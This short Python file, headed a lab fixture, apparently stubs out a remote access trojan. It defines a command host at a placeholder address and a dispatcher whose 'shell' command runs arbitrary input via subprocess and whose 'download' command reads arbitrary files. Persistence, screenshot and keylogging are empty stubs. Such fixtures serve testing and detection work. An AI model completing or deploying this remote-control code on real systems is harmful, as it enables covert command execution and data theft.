# lab rat fixture
import socket, subprocess
HOST, PORT = "198.51.100.30", 4443
commands = ["shell", "download", "upload", "persist", "screenshot", "keylog"]
def dispatch(cmd, arg):
    if cmd == "shell": return subprocess.run(arg, shell=True)
    if cmd == "download": return open(arg, "rb").read()
    if cmd == "upload": return open(arg, "wb").write(b"")
    if cmd == "persist": return True
    if cmd == "screenshot": return True
    if cmd == "keylog": return True
